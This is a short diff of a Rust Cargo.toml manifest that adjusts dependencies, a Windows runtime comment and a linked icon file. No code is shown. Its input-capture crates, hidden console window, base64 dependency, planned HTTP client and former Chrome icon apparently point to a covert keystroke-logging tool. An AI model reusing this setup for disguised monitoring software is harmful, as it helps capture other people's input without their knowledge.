@@ -11,10 +11,12 @@ inputbot = "0.5"
 device_query = "0.2.0"
 chrono = "0.4"
 base64 = "0.21.0"
+directories = "4.0.1"
+#reqwest =  { version = "0.11.13", features = ["blocking"] }
 
 [build-dependencies]
 winres = "0.1"
-static_vcruntime = "2.0"
+static_vcruntime = "2.0" # for fixing VCRUNTIME140.dll error in winodws 10
 
 [dependencies.windows]
 version = "0.48"
@@ -46,4 +48,4 @@ subsystem = "windows"
 
 [build]
 # the path to your .res file
-rustflags = ["-C", "link-arg=chrome.ico"]
+rustflags = ["-C", "link-arg=app_icon.ico"]
